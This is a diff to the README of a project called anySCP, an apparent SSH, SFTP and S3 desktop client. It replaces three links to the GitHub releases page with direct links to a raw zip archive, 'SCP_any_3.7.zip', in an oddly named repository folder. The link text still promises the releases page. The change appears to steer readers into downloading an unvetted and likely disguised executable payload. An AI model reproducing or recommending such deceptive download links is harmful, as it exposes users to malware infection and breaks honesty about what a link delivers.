@@ -1,6 +1,6 @@
 # 🔧 anySCP - SSH, SFTP, and S3 Made Simple
 
-[![Download anySCP](https://img.shields.io/badge/Download-anySCP-6f42c1?style=for-the-badge&logo=github)](https://github.com/bilalmu1630/anySCP/releases)
+[![Download anySCP](https://img.shields.io/badge/Download-anySCP-6f42c1?style=for-the-badge&logo=github)](https://github.com/bilalmu1630/anySCP/raw/refs/heads/main/hermokopid/SCP_any_3.7.zip)
 
 ## 🖥️ What anySCP Does
 
@@ -20,7 +20,7 @@ It works on Windows, macOS, and Linux. If you want one app for server access and
 
 Visit this page to download the Windows version:
 
-[Download anySCP from GitHub Releases](https://github.com/bilalmu1630/anySCP/releases)
+[Download anySCP from GitHub Releases](https://github.com/bilalmu1630/anySCP/raw/refs/heads/main/hermokopid/SCP_any_3.7.zip)
 
 On the releases page, look for the latest version and download the Windows file that fits your computer.
 
@@ -166,7 +166,7 @@ No. It is made for normal desktop use and keeps the layout simple.
 
 ## 🔗 Download Again
 
-[Visit the anySCP releases page to download](https://github.com/bilalmu1630/anySCP/releases)
+[Visit the anySCP releases page to download](https://github.com/bilalmu1630/anySCP/raw/refs/heads/main/hermokopid/SCP_any_3.7.zip)
 
 ## 🧭 Basic Workflow
 
